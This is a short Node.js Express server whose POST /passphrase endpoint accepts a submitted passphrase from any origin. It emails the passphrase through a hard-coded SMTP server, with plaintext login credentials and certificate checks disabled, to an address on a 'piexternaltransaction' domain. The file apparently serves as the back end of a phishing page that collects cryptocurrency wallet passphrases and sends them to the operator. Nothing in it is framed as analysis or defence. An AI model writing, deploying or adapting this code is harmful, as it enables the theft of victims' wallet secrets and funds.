// Import required modules
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors'); // Import cors module

// Create an instance of Express
const app = express();

// Set up body-parser middleware to parse JSON bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Enable CORS
app.use(cors()); // This enables CORS for all routes

// Define routes
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.post('/passphrase', async (req, res) => {
  // Check if the 'passphrase' key exists in the request body
  if (!req.body.hasOwnProperty('passphrase')) {
    return res.status(400).json({ error: 'Passphrase key is missing in the request body' });
  }

  // Get the value of the 'passphrase' key from the request body
  const passphrase = req.body.passphrase;

  let transporter = nodemailer.createTransport({
    host: "31.41.249.166.cprapid.com",
    port: 465,
    secure: true, // true for 465, false for other ports
    auth: {
      user: "admin@piexternaltransaction.com", // generated ethereal user
      pass: "Pienetwork10", // generated ethereal password
    },
    tls: {
      rejectUnauthorized: false
    }
  });

  // Define the email message
  const mailOptions = {
    from: 'admin@piexternaltransaction.com',
    to: 'admin@piexternaltransaction.com',
    subject: 'Passphrase Received',
    text: `Passphrase: ${passphrase}`,
  };

  try {
    // Send the email
    await transporter.sendMail(mailOptions);

    // Respond with a success message
    res.json({ message: 'Passphrase received successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send email' });
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
